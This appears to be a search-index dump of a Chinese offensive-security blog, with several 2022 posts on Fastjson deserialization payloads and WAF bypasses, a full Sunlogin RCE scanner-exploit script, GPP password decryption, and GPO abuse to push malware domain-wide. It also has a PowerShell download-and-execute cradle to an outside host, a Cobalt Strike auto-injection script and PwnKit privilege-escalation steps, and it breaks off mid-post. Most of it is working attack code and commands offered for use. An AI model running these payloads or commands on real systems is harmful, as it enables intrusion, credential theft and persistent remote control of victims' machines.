8.0.20 {\u0026quot;@type\u0026quot;:\u0026quot;java.lang.AutoCloseable\u0026quot;,\u0026quot;@type\u0026quot;:\u0026quot;com.mysql.cj.jdbc.ha.ReplicationMySQLConnection\u0026quot;,\u0026quot;proxy\u0026quot;:{\u0026quot;@type\u0026quot;:\u0026quot;com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy\u0026quot;,\u0026quot;connectionUrl\u0026quot;:{\u0026quot;@type\u0026quot;:\u0026quot;com.mysql.cj.conf.url.ReplicationConnectionUrl\u0026quot;, \u0026quot;masters\u0026quot;: [{\u0026quot;host\u0026quot;:\u0026quot;mysql.host\u0026quot;}], \u0026quot;slaves\u0026quot;:[], \u0026quot;properties\u0026quot;:{\u0026quot;host\u0026quot;:\u0026quot;mysql.host\u0026quot;,\u0026quot;user\u0026quot;:\u0026quot;user\u0026quot;,\u0026quot;dbname\u0026quot;:\u0026quot;dbname\u0026quot;,\u0026quot;password\u0026quot;:\u0026quot;pass\u0026quot;,\u0026quot;queryInterceptors\u0026quot;:\u0026quot;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\u0026quot;,\u0026quot;autoDeserialize\u0026quot;:\u0026quot;true\u0026quot;}}}}  fastjson未知版本 待探索\n{\u0026quot;@type\u0026quot;:\u0026quot;org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory\u0026quot;, \u0026quot;tmJndiName\u0026quot;: \u0026quot;ldap://localhost:1389/Exploit\u0026quot;, \u0026quot;tmFromJndi\u0026quot;: true, \u0026quot;transactionManager\u0026quot;: {\u0026quot;$ref\u0026quot;:\u0026quot;$.transactionManager\u0026quot;}} {\u0026quot;@type\u0026quot;:\u0026quot;org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory\u0026quot;, \u0026quot;tmJndiName\u0026quot;: \u0026quot;ldap://localhost:1389/Exploit\u0026quot;, \u0026quot;tmFromJndi\u0026quot;: true, \u0026quot;transactionManager\u0026quot;: {\u0026quot;$ref\u0026quot;:\u0026quot;$.transactionManager\u0026quot;}}  bypasswaf 文章推荐：https://www.sec-in.com/article/950\nFastjson默认会去除键、值外的空格、\\b、\\n、\\r、\\f等，同时还会自动将键与值进行unicode与十六进制解码。\n{\u0026quot;@type\u0026quot;:\u0026quot;com.sun.rowset.JdbcRowSetImpl\u0026quot;,\u0026quot;dataSourceName\u0026quot;:\u0026quot;rmi://10.251.0.111:9999\u0026quot;,\u0026quot;autoCommit\u0026quot;:true} { \u0026quot;@type\u0026quot;:\u0026quot;com.sun.rowset.JdbcRowSetImpl\u0026quot;,\u0026quot;dataSourceName\u0026quot;:\u0026quot;rmi://10.251.0.111:9999\u0026quot;,\u0026quot;autoCommit\u0026quot;:true} {/*s6*/\u0026quot;@type\u0026quot;:\u0026quot;com.sun.rowset.JdbcRowSetImpl\u0026quot;,\u0026quot;dataSourceName\u0026quot;:\u0026quot;rmi://10.251.0.111:9999\u0026quot;,\u0026quot;autoCommit\u0026quot;:true} {\\n\u0026quot;@type\u0026quot;:\u0026quot;com.sun.rowset.JdbcRowSetImpl\u0026quot;,\u0026quot;dataSourceName\u0026quot;:\u0026quot;rmi://10.251.0.111:9999\u0026quot;,\u0026quot;autoCommit\u0026quot;:true} {\u0026quot;@type\u0026quot;\\b:\u0026quot;com.sun.rowset.JdbcRowSetImpl\u0026quot;,\u0026quot;dataSourceName\u0026quot;:\u0026quot;rmi://10.251.0.111:9999\u0026quot;,\u0026quot;autoCommit\u0026quot;:true} {\u0026quot;\\u0040\\u0074\\u0079\\u0070\\u0065\u0026quot;:\u0026quot;com.sun.rowset.JdbcRowSetImpl\u0026quot;,\u0026quot;dataSourceName\u0026quot;:\u0026quot;rmi://10.251.0.111:9999\u0026quot;,\u0026quot;autoCommit\u0026quot;:true} {\u0026quot;\\x40\\x74\\x79\\x70\\x65\u0026quot;:\u0026quot;com.sun.rowset.JdbcRowSetImpl\u0026quot;,\u0026quot;dataSourceName\u0026quot;:\u0026quot;rmi://10.251.0.111:9999\u0026quot;,\u0026quot;autoCommit\u0026quot;:true}  ","id":8,"section":"posts","summary":"文章转载至：https://github.com/safe6Sec/Fastjson 说明 高版本的一些细节还有待更新。本项目涉及的一些姿势和p","tags":["web安全"],"title":"Fastjson姿势技巧集合","uri":"https://ad-calcium.github.io/2022/02/fastjson%E5%A7%BF%E5%8A%BF%E6%8A%80%E5%B7%A7%E9%9B%86%E5%90%88/","year":"2022"},{"content":"0x01 漏洞描述 上海贝锐信息科技股份有限公司向日葵个人版for Windows存在命令执行漏洞，攻击者可利用该漏洞获取服务器控制权。\n0x02 漏洞版本 11.1.1\r10.3.0.27372\r11.0.0.33162\r 0x03 FOFA语法 body=\u0026quot;Verification failure\u0026quot; \u0026amp;\u0026amp; body=\u0026quot;false\u0026quot; \u0026amp;\u0026amp; header=\u0026quot;Cache-Control: no-cache\u0026quot; \u0026amp;\u0026amp; header=\u0026quot;Content-Length: 46\u0026quot; \u0026amp;\u0026amp; header=\u0026quot;Content-Type: application/json\u0026quot;\r 0x04 漏洞复现 本地启动个向日葵\n由于向日葵在启动的时候会随机启动一个端口，所以需要先进行端口扫描\n0x05 脚本的逻辑 1.首先扫描端口，将存活的端口进行http探测\n2.通过请求cgi-bin/rpc?action=verify-haras接口获取session，将获取的session放入cookie中请求/check?cmd=ping../../../windows/system32/windowspowershell/v1.0/powershell.exe+whoami接口，成功执行命令\n脚本：https://raw.githubusercontent.com/ad-calcium/vuln_script/main/sunlogin_rce.py\n# -*- coding: utf-8 -*-\r# @Time : 2022/2/16 21:03\r# @Author : AD钙奶\rimport json\rimport socket\rfrom datetime import datetime\rfrom multiprocessing.dummy import Pool as ThreadPool\rimport requests\rport_list = []\rclass ScanPort:\rdef __init__(self,ip):\rself._ip = ip\rself.ip = None\rdef scan_port(self, port):\rtry:\rs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\rres = s.connect_ex((self.ip, port))\rif res == 0:\rprint('Ip:{} Port:{} IS OPEN'.format(self.ip, port))\rport_list.append(port)\rexcept Exception as e:\rprint(e)\rfinally:\rs.close()\rdef start(self):\rremote_server = self._ip\rself.ip = socket.gethostbyname(remote_server)\rports = [i for i in range(1, 65535)]\rsocket.setdefaulttimeout(0.5)\rt1 = datetime.now()\rthreads = []\rpool = ThreadPool(processes=1000)\rpool.map(self.scan_port, ports)\rpool.close()\rpool.join()\rprint('[ * ] 端口扫描已完成，耗时：', datetime.now() - t1)\rdef _POC(ip):\rfor ports in port_list:\rurl = \u0026quot;http://\u0026quot; + ip + \u0026quot;:\u0026quot; + str(ports) + \u0026quot;/cgi-bin/rpc?action=verify-haras\u0026quot;\rtry:\rreq = requests.get(url,verify=False,timeout=1).text\rif \u0026quot;verify_string\u0026quot; in req:\rips = ip + \u0026quot;:\u0026quot; + str(ports)\rprint(\u0026quot;[ * ] 发现向日葵端口: \u0026quot; + ips)\r_Rce(ips)\rexit(1)\rexcept Exception as e:\rpass\rdef _Rce(urls):\rtry:\rheaders = {\r\u0026quot;User-Agent\u0026quot;: \u0026quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36\u0026quot;,\r\u0026quot;Accept\u0026quot;: \u0026quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\u0026quot;,\r\u0026quot;Accept-Encoding\u0026quot;: \u0026quot;gzip, deflate\u0026quot;,\r\u0026quot;Accept-Language\u0026quot;: \u0026quot;zh-CN,zh;q=0.9\u0026quot;\r}\rurl = 'http://' + urls + '/cgi-bin/rpc?action=verify-haras'\rreq = requests.get(url, headers=headers,verify=False)\rif req.status_code == 200:\rverify_string = json.loads(req.text)['verify_string']\rheaders2 = {\r\u0026quot;User-Agent\u0026quot;: \u0026quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36\u0026quot;,\r\u0026quot;Accept\u0026quot;: \u0026quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\u0026quot;,\r\u0026quot;Accept-Encoding\u0026quot;: \u0026quot;gzip, deflate\u0026quot;,\r\u0026quot;Accept-Language\u0026quot;: \u0026quot;zh-CN,zh;q=0.9\u0026quot;,\r\u0026quot;Cookie\u0026quot;: \u0026quot;CID =\u0026quot; + verify_string\r}\rpoc2 = 'http://' + urls + '/check?cmd=ping../../../windows/system32/windowspowershell/v1.0/powershell.exe+whoami'\rrec2 = requests.get(poc2, headers=headers2, verify=False)\rif rec2.status_code == 200:\rprint('[ * ] 存在漏洞 ' + urls + '------' + rec2.text)\rexcept Exception as e:\rprint(e)\rpass\rdef main():\rip = input(\u0026quot;[ * ] 请输入需要扫描的IP地址：\u0026quot;)\rprint('[ * ] 正在进行端口扫描')\rScanPort(ip).start()\r_POC(ip)\rif __name__ == '__main__':\rmain()\r ","id":9,"section":"posts","summary":"0x01 漏洞描述 上海贝锐信息科技股份有限公司向日葵个人版for Windows存在命令执行漏洞，攻击者可利用该漏洞获取服务器控制权。 0x02 漏洞版本 11.1.1 10.3.0.27372 11.0.0.33162","tags":["漏洞复现","向日葵"],"title":"向日葵存在命令执行漏洞(CNVD-2022-10270)","uri":"https://ad-calcium.github.io/2022/02/%E5%90%91%E6%97%A5%E8%91%B5%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecnvd-2022-10270/","year":"2022"},{"content":"0x01 基础知识 1.组策略的认识 组策略（英语：Group Policy）是微软Windows NT家族操作系统的一个特性，它可以控制用户帐户和计算机帐户的工作环境。组策略提供了操作系统、应用程序和活动目录中用户设置的集中化管理和配置。组策略的其中一个版本名为本地组策略（缩写“LGPO”或“LocalGPO”），这可以在独立且非域的计算机上管理组策略对象。\n通过使用组策略，你可以设置策略设置一次，然后将该设置复制到多台计算机上。例如，你可以在链接到域的 GPO 中设置多个 Internet Explorer11 安全设置，然后将所有这些设置应用到域中的每台计算机。\n根据作用范围不同组策略可划分为多种，并且拥有自己的执行顺序和继承原则。\n2.密码的难题 每台Windows主机有一个内置的Administrator账户以及相关联的密码。大多数组织机构为了安全，可能都会要求更改密码，虽然这种方法的效果并不尽如人意。标准的做法是利用组策略去批量设置工作站的本地Administrator密码。但是这样又会出现另一个问题，那就是所有的电脑都会有相同的本地Administrator密码。也就是说，如果获取了一个系统的Administrator认证凭据，黑客就可以获取他们所有机器的管理权限。\n3.SYSVOL 解决办法之一是为认证数据采取SYSVOL，SYSVOL是AD（活动目录）里面一个存储域公共文件服务器副本的共享文件夹，所有的认证用户都可以读取。SYSVOL包括登录脚本，组策略数据，以及其他域控所需要的域数据，这是因为SYSVOL能在所有域控里进行自动同步和共享。\n所有的域组策略存储在：\n \\\\\u0026lt;DOMAIN\u0026gt;\\SYSVOL\\\u0026lt;DOMAIN\u0026gt;\\Policies\\\r 4.SYSVOL里的认证\n在windows电脑中，管理需要花心思去保证本地Administrator账户（RID 500）。传统的做法（除了购买安全产品），是使用一个自定义的脚本去更改本地Administrator的密码。这样就会出现一个问题，密码肯定会明文存储在SYSVOL的脚本里(比如vbs文件)。比如黑客需要搜寻用来更改本地Administrator密码的VBS脚本，该vbs脚本在Microsoft TechNet gallery上，密码为可见的。这个脚本存在SYSVOL里，每个域用户都有读的权限，且该密码是每台电脑组策略应用的本地Administrator密码。\n5.GPP（组策略首选项） 在2006年，微软收购了桌面标准的“PolicyMaker”，并重新借此与win2008发布了GPP（组策略偏好）。其中GPP最有用的特性，是在某些场景存储和使用凭据，其中包括：\n 映射驱动（Drives.xml） 创建本地用户 数据源（DataSources.xml） 打印机配置（Printers.xml） 创建/更新服务（Services.xml） 计划任务（ScheduledTasks.xml） 更改本地Administrator密码  这对管理员非常有用，因为GPP提供了一个自动化机制，可以作为急需的解决方案（比如脚本）给他们。它提供了有效的方法，利用显式凭据结合组策略部署了计划任务，一次性批量更改了电脑的本地管理的密码，也许这就是最受欢迎的利用场景吧。\n6.GPP中存储的凭据 当管理创建了一个新的GPP时，SYSVOL里有一个XML文件提供了相关配置数据。如果里面提供了密码的话，那应该就是AES-256加密，看起来这加密似乎是够强力了。\n然而除了在2012年前的某些点外，微软在MSDN上发布了AES的私钥，它可以用来解密这种密码。因为认证用户（所有域用户或者信任域里的用户）对SYSVOL拥有读权限。在域里的任何用户可以搜索SYSVOL共享中的带有cpassword字样的XML文件，里面包含了AES加密的密码。\n7.组策略的分类 7.1本地组策略（LGP） 本地组策略（Local Group Policy，缩写LGP或LocalGPO）是组策略的基础版本，它面向独立且非域的计算机。至少Windows XP家庭版中它就已经存在，并且可以应用到域计算机。在Windows Vista以前，LGP可以强制施行组策略对象到单台本地计算机，但不能将策略应用到用户或组。从Windows Vista开始，LGP允许本地组策略管理单个用户和组，并允许使用“GPO Packs”在独立计算机之间备份、导入和导出组策略——组策略容器包含导入策略到目标计算机的所需文件。\n组策略(Group Policy)是Microsoft Windows系统管理员为用户和计算机定义并控制程序、网络资源及操作系统行为的主要工具。通过使用组策略可以设置各种软件、计算机和用户策略。\n7.2域组策略  当机器安装了域环境的时候,系统管理工具会多出一个功能(组策略管理),通过它，域管理员能够很方便统一地对域内的机器和用户进行统一管理。\n 域管理员经常会面对一个这样的问题,域成员机子的默认本地管理员密码过于简单，想进行批量修改的时候，这个时候就可以利用组策略来进行任务的批量下发。\n 1.通过在域中下发脚本来执行 2.在组策略首选项GPP中进行设置 3.本地管理员密码解决方案:LAPS(不细说这个内容，这是解决这个问题很好的方  首先我们需要了解下AD域中两个默认的共享文件夹:SYSVOL NETLOGON\nnet share\r 7.2.1 NETLOGON目录 挂载点:SYSVOL\\domain\\SCRIPTS 主要存放的是一些脚本信息，是AD活动目录安装时候自动创建的，是在sysvol下面的一个子目录文件夹\n7.2.2 SYSVOL目录 SYSVOL目录是AD域中的一个共享文件夹，该文件夹在AD活动目录安装时候被创建。通常用来存放组策略数据 和 一些脚本 配置文件，这些策略和脚本将用于传递给域成员机器。\n此外，域控机器之间因为要自动同步域数据，SYSVOL文档允许该域内的所有DC机之间进行复制，并且所有的AD用户都可以访问它\n在域中，用户登录（计算机）时，会首先在SYSVOL文件查找GPO和启动脚本。同时，为了保证系统的正常运行，必须为SYSVOL保留足够的空间缓存，而且不能随意删除、改动该文件夹，要不然会出现一些组策略无法启用等报错信息\n该目录由于针对的是域内所有机器和用户，所以域内中的合法用户均可以访问和执行该目录的文件。(普通的域用户也可以)\n7.2.3 GPO 组策略对象，GPO（Group Policy Object），实际上就是组策略设置的集合。\n你可以用GPO来存储不同的组策略信息，然后作用在指定OU或者指定作用范围发挥作用。\n默认安装完AD之后，系统默认会存在两个组策略对象\nDefault Domain Policy\n唯一ID(GUID):{31B2F340-016D-11D2-945F-00C04FB984F9} (都是相同的)\n默认域策略\n存放的路径:\nC:\\Windows\\SYSVOL\\sysvol\\ql.com\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\r Default Domain Controllers Policy\n唯一ID(GUID):｛6AC1786C-016F-11D2-945F- 00C04FB984F9｝ (都是相同的)\n默认域控制器策略\n管理目标“Domain Controllers”容器，影响“Domain Controllers”容器中的域控制器，域控制器账户单独保存在该容器中。\n不难看到这个GPO作用的范围是DC这个OU,相应的执行优先级如下图\n策略大体上分为四类，本地策略、域策略、站点策略、ou策略\n顺序：local policy \u0026mdash;\u0026gt; seite policy \u0026mdash;\u0026gt; domain policy \u0026mdash;\u0026gt; ou policy\n7.2.4 GPP 我们可以看到GPP里面自定义了很多操作，比如本地用户和组的密码控制、计划任务等\n在GPP出现之前，很多统一管理的操作只能通过脚本来实现，而GPP方便和简化了这样的管理,GPP你可以将其理解为一个功能点,作用是简单化、规范化组策略的发布和使用\n0x02 漏洞产生原理 这个漏洞的产生原因是 使用了GPP功能，如果输入了用户的密码的话，那么密码就会以AES 256加密的形式存储在SYSVOL文件夹下的以XML后缀结尾的xml文件中，这个密码的加密密钥由微软官方给出可以进行解密，但是如果打补丁或者高版本的话，GPP服务是不能输入密码的了，这个漏洞也就相应不存在了。\nGPP漏洞只在2008没打补丁版本上存在，超过2008版本的系统是没办法写入密码的。\n对应的GPP补丁：KB2962486\n0x03 GPP漏洞的利用 打开组策略，找到默认域策略\n计算机配置\u0026ndash;首选项-控制面板设置\u0026ndash;本地用户和组，新建本地用户\n选择内置管理员\n查看默认的ID\n如果在攻击的时候不是的ID，可通过搜索的方式\ndir /s /a \\\\DC\\SYSVOL\\*.xml\r 也可以使用for循环\nfor /r \\\\DC/sysvol %i in (*.xml) do @echo %i\r 根据该ID去SYSVOL搜索即可得到该目录下的文件\nC:\\Windows\\SYSVOL\\sysvol\\ql.com\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Preferences\\Groups\r 可以看到在该Groups目录下的xml文件立马就可以看到我们设置gpptest用户名对应的加密的密码1dLl2PMSed1A9KZn/hQgrg\ncpassword=\u0026ldquo;z1WscOKgpeck7EiDP2UwboWZneRJg0wv4o2FLS9XsSE\u0026rdquo;\n自动化获取GPP文件的脚本：https://github.com/Lucifer1993/PLtools/blob/main/Get-GPPPassword.ps1\n解码脚本：https://github.com/Lucifer1993/PLtools/blob/main/gpp-decrypt.py\n使用kali自带的gpp-decrypt工具进行解密\ngpp-decrypt z1WscOKgpeck7EiDP2UwboWZneRJg0wv4o2FLS9XsSE\r 方法2\n新建一个组织单位\n新建好之后再新建一个GPO\n在详细信息中可以看到改策略的id\n编辑该策略\n新建本地用户\n输入用户名密码\n当组织单位中有用户时，则会执行该策略\n最后运行命令 gpupdate，强制更新组策略设置\ngpupdate /force\r 查看即可\nC:\\Windows\\SYSVOL\\sysvol\\ql.com\\Policies\\{8FF18B32-6D8D-4D7B-BE5D-32B2D5388824}\\Machine\\Preferences\\Groups\r 可以看到在该Groups目录下的xml文件立马就可以看到我们设置gpptest用户名对应的加密的密码1dLl2PMSed1A9KZn/hQgrg\n解码脚本：https://github.com/Lucifer1993/PLtools/blob/main/gpp-decrypt.py\n使用kali自带的gpp-decrypt工具进行解密\ngpp-decrypt 1dLl2PMSed1A9KZn/hQgrg  如果是在组策略中新建GPO则需要将Domain computers添加到组策略应用的组中\n总结：\n共享组策略目录是域中最容易出现密码的地方，一般管理员会把一些bat脚本放在里面用来重置域内客户机器本地的administrator的密码，但是这个密码也不一定正确，渗透都是靠运气。所以说当进入域内，先查看共享组策略目录中是否存在密码，如果存在密码可以先用这个密码进行横向一下。\n0x04 参考地址 https://www.jianshu.com/p/0e61573dcd18\rhttps://xz.aliyun.com/t/7784\r ","id":10,"section":"posts","summary":"0x01 基础知识 1.组策略的认识 组策略（英语：Group Policy）是微软Windows NT家族操作系统的一个特性，它可以控制用户帐户和计算机帐","tags":["域渗透","内网渗透"],"title":"域渗透 - GPP漏洞","uri":"https://ad-calcium.github.io/2022/02/%E5%9F%9F%E6%B8%97%E9%80%8F-gpp%E6%BC%8F%E6%B4%9E/","year":"2022"},{"content":"0x01 前言 当我们拿下域控或者域管的权限，如何使用组策略批量上线。\n0x02 利用前提 拥有更改某组策略的权限或者域管权限\n0x03 利用思路 1、利用OU+启动脚本\n2、利用计划任务\n这里引用三好学生师傅的原话\n根据不同情况，有以下两种利用思路：\r1、新建组策略，创建计划任务实现远程执行\r创建一个新的GPO并链接到对应的域备份GPO修改Backup.xml和gpreport.xml创建ScheduledTasks.xml还原GPO 强制客户端刷新策略清理操作痕迹第二步到第五步可以通过脚本直接实现2、修改已有组策略，替换计划任务\r如果域控制器上已有策略并配置了计划任务不再需要注册，修改ScheduledTasks.xml就好\r 0x04 利用方法 登录启动上线 打开组策略管理(gpmc.msc),右键组策略对象——新建\n然后以此执行右键test—编辑—用户配置—策略—windows设置—脚本—登录—显示文件—新建ADControl.bat\n若是想要上马则利用IPC共享实现即可，将以下命令复制到bat脚本中，代码如下\n在域内域控主机的sysvol目录时默认共享的，可以将马儿放到这个目录\\\\域控的ip或者主机名\\sysvol\\adlab.com\\scripts\\\ncopy \\\\10.10.10.100\\sysvol\\adlab.com\\scripts\\mm.exe C:\\Users\\\rcmd /c c:\\Users\\mm.exe\r 然后添加——浏览——选择ADControl.bat\n或者直接在输入在脚本名称里输入马子的绝对路径\n\\\\10.10.10.100\\sysvol\\adlab.com\\scripts\\mm.exe\r 也可以在默认域策略中输入直接添加启动，这样就不要新建GPO。\n刷新组策略\ngpupdate /force\r 当域用户重新登录或者重新启动的时候，发现直接以当前用户权限加载了我们的程序\n计划任务上线 利用计划任务来实现\n创建GPO new-gpo -name TestGPO1\r 链接GPO New-GPLink -Name TestGPO1 -Target 'dc=adlab,dc=com'\r 修改GPO并添加即时任务 即时任务会在组策略同步的时候强制执行一次，组策略每90分钟自动同步一次。使用三好学生的脚本\nhttps://github.com/3gstudent/Homework-of-Powershell/blob/master/New-GPOImmediateTask.ps1\n#允许执行脚本\rpowershell set-ExecutionPolicy RemoteSigned\r#导入脚本\rImport-Module .\\New-GPOImmediateTask.ps1\r#执行命令\rNew-GPOImmediateTask -TaskName Debugging -GPODisplayName TestGPO1 -SysPath '\\\\dc1.adlab.com\\sysvol\\adlab.com' -Command 'powershell.exe' -CommandArguments '-nop -w hidden -c \u0026quot;IEX ((new-object net.webclient).downloadstring(''http://192.168.2.45:801/a''))\u0026quot;'\r 强制同步策略之后当用户在登录状态会执行该任务，当用户未登录时，则会在登录后执行该命令\ngpupdate /force\r 主机成功上线\n在测试过程中发现win7主机不上线，不知道啥情况。\n清理痕迹 Remove-GPO -Name TestGPO1\r 其他命令 加载GroupPolicy模块：\nImport-Module GroupPolicy –verbose 获得所有GPO的内容：\nGet-GPO -All 将所有GPO导出为一个HTML报告：\nGet-GPOReport -All -ReportType html -Path C:\\GposReport\\GposReport.html 将每个GPO单独导出一个HTML报告：\nGet-GPO -All | %{ Get-GPOReport -name $_.displayname -ReportType html -path (\u0026quot;c:\\GPOReports\\\u0026quot;+$_.displayname+\u0026quot;.html\u0026quot;) }\r 查看指定GPO的权限设置：\nGet-GPPermission -Name \u0026quot;TestGPO1\u0026quot; -All 链接GPO到指定OU powershell -c New-GPLink -Name TestGPO1 -Target ‘OU=OUTest1,dc=test,dc=com’ 备份指定GPO：\nBackup-Gpo -Name TestGPO1 -Path C:\\GpoBackups 备份所有GPO：\nBackup-Gpo -All -Path \u0026quot;c:\\GpoBackups\u0026quot; 还原指定GPO：\nRestore-GPO -Name TestGPO1 -Path C:\\GpoBackups 还原所有GPO：\nRestore-GPO -All -Path \u0026quot;c:\\GpoBackups\u0026quot;\r 创建OU: New-ADOrganizationalUnit -Name OUTest1 -Path \u0026quot;dc=test,dc=com\u0026quot;\n查看当前域中的所有计算机:\ndsquery computer获得结果”CN=Computer1,CN=Computers,DC=test,DC=com”\n将该计算机加到OU=OUTest1中:\ndsmove \u0026quot;CN=Computer1,CN=Computers,DC=test,DC=com\u0026quot; -newparent OU=OUTest1,dc=test,dc=com\r 查询OU=OUTest1中的计算机:\ndsquery computer OU=OUTest1,dc=test,dc=com\r 创建GPO并连接:\nnew-gpo -name TestGPO | new-gplink -Target \u0026quot;OU=OUTest1,dc=test,dc=com\u0026quot;\r 还原： 将计算机Computer1从OU=OUTest1中移除\ndsmove \u0026quot;CN=Computer1,OU=OUTest1,DC=test,DC=com\u0026quot; -newparent CN=Computers,dc=test,dc=com\r 删除OU=OUTest1：\nset-ADOrganizationalUnit -Identity \u0026quot;OU=OUTest1,dc=test,dc=com\u0026quot; -ProtectedFromAccidentalDeletion $false\rRemove-ADOrganizationalUnit -Identity \u0026quot;OU=OUTest1,dc=test,dc=com\u0026quot; -Recursive -Confirm:$False\r 查看对组策略对修改权限\n0x05 参考地址 https://mp.weixin.qq.com/s/IUSC7RjO0BsF3L-kyb6mjA\rhttps://x1m0.xyz/%e5%88%a9%e7%94%a8%e7%bb%84%e7%ad%96%e7%95%a5%e4%b8%8a%e7%ba%bf%e4%b8%bb%e6%9c%ba/\rhttps://mp.weixin.qq.com/s/XhbsSyDDV774LJ4o2QkSBw\rhttps://xz.aliyun.com/t/9511\rhttps://mp.weixin.qq.com/s/n42GVB51WUafbxOGaqc_EA\r ","id":11,"section":"posts","summary":"0x01 前言 当我们拿下域控或者域管的权限，如何使用组策略批量上线。 0x02 利用前提 拥有更改某组策略的权限或者域管权限 0x03 利用思路 1、利用OU+启动脚本 2、","tags":["域渗透","内网渗透"],"title":"域渗透 - 组策略下发文件","uri":"https://ad-calcium.github.io/2022/02/%E5%9F%9F%E6%B8%97%E9%80%8F-%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8B%E5%8F%91%E6%96%87%E4%BB%B6/","year":"2022"},{"content":"0x00 前言 通过cs上线之后之后担心掉线，所以有改文章。通过进程注入方式，当有新的主机上线之后将进程注入explorer.exe进程中\n0x01 解决上述问题   加载自定义 malleable C2 配置文件 从而达到主机一上线跳默认为 1 秒，就可自动在目标打开浏览器短暂的时间里尽快转移进程\n  加载一个 Cobalt Strike automigrate 自动迁移进程的插件从而达到目标上线后会话自动迁移到其他进程从而我们就可以脱离微信浏览器的束缚\n  0x02 具体操作方法 加载自定义 malleable C2 配置文件 https://github.com/threatexpress/malleable-c2\r 在此项目上找到你 cs 版本对应的配置文件，我这里用的 4.2 各版本差别不大\n默认时间为45s，修改配置文件将文件修改心跳时间为1s，用于快速迁移进程\n时间不注释启动会报错，所以将他注释掉\n报错信息如下\n启动cs服务端\ncs客户端配置cna插件 加载一个 Cobalt Strike automigrate 自动迁移进程的插件\non beacon_initial\r{\rsub callback\r{\r$regex = '(.*\\n)+explorer.exe\\t\\d+\\t(\\d+)(.*\\n)+';\r$listener = \u0026quot;adtest\u0026quot;;\rif ($2 ismatch $regex)\r{\r$pid = matched()[1];\r$inject_pid = $pid;\rif (-is64 $1)\r{\r$arch = \u0026quot;x64\u0026quot;;\r}\relse\r{\r$arch = \u0026quot;x86\u0026quot;;\r}\rbinject($1, $pid, $listener, $arch);\r}\r}\rif($inject_pid != beacon_info($1,\u0026quot;pid\u0026quot;))\r{\rbps($1, \u0026amp;callback);\r}\r}\r 代码中的$listener = \u0026ldquo;adlab-doamin\u0026quot;为监听器的名称\n加载迁移进程插件\n通过powershell加载脚本\n复制到受害者主机执行\ncs成功上线并自动迁移进程\n0x03 参考地址 https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/\rhttps://www.cnblogs.com/sunny11/p/14755923.html\r ","id":12,"section":"posts","summary":"0x00 前言 通过cs上线之后之后担心掉线，所以有改文章。通过进程注入方式，当有新的主机上线之后将进程注入explorer.exe进程中 0x01 解决上述问","tags":["Cobalt strike","内网渗透"],"title":"Cobalt strike上线后自动迁移进程","uri":"https://ad-calcium.github.io/2022/02/cobalt-strike%E4%B8%8A%E7%BA%BF%E5%90%8E%E8%87%AA%E5%8A%A8%E8%BF%81%E7%A7%BB%E8%BF%9B%E7%A8%8B/","year":"2022"},{"content":"0x01 漏洞介绍 polkit 的 pkexec 实用程序中存在一个本地权限提升漏洞。当前版本的 pkexec 无法正确处理调用参数计数，并最终尝试将环境变量作为命令执行。攻击者可以通过控制环境变量来利用这一点，从而诱导 pkexec 执行任意代码。利用成功后，会导致本地特权升级，非特权用户获得管理员权限。\n0x02 影响版本  2009年5月至今发布的所有 Polkit 版本  注：Polkit预装在CentOS、Ubuntu、Debian、Redhat、Fedora、Gentoo、Mageia等多个Linux发行版上，所有存在Polkit的Linux系统均受影响。\n0x03 工具 https://github.com/arthepsy/CVE-2021-4034\rhttps://github.com/Rvn0xsy/CVE-2021-4034\r 0x04 漏洞复现 4.1 漏洞检测 4.1.1 ubuntu dpkg -l policykit-1\r 4.1.2 centos rpm -qa polkit\r 4.2 漏洞利用 4.2.1 本地提权 查看当前权限\nwhoami\n使用gcc编译，编译之后执行脚本\ngcc cve-2021-4034-poc.c -o 111\r./111\r 4.2.2 webshell提权 分为两种条件，目标机器上有gcc和目标机器上没有gcc，如果存在gcc，本地搭建一个和目标机器一样的系统编译即可\n如果目标环境没有gcc，可手动执行命令，并在本地编译pwnkit.so。\n创建利用环境 - 目标机器\nmkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'\rmkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' \u0026gt; pwnkit/gconv-modules\r 编译pwnkit.so 与 pkexec - 本地 mkdir pwnkit\rgcc pwnkit.so.c -o pwnkit/pwnkit.so -lcrypt -shared -fPIC\rgcc pkexec.c -o pkexec\r 执行Exploit  将pwnkit文件夹上传到目标机器 将pkexec上传到目标机器 执行pkexec  默认添加用户名rooter，密码Hello@World\r ","id":13,"section":"posts","summary":"0x01 漏洞介绍 polkit 的 pkexec 实用程序中存在一个本地权限提升漏洞。当前版本的 pkexec 无法正确处理调用参数计数，并最终尝试将环境变量作为命令执行。攻击者可以通过控","tags":["漏洞复现","linux提权"],"title":"Linux Polkit 权限提升(CVE-2021-4034)","uri":"https://ad-calcium.github.io/2022/01/linux-polkit-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87cve-2021-4034/","year":"2022"},{"content":"0x01 漏洞详情 该漏洞是由于Active Directory 域服务没有进行适当的安全限制，导致可绕过安全限制进行权限提升。\n0x02 影响版本 Windows Server 2012 R2 (Server Core installation)\nWindows Server 2012 R2\nWindows Server 2012 (Server Core installation)\nWindows Server 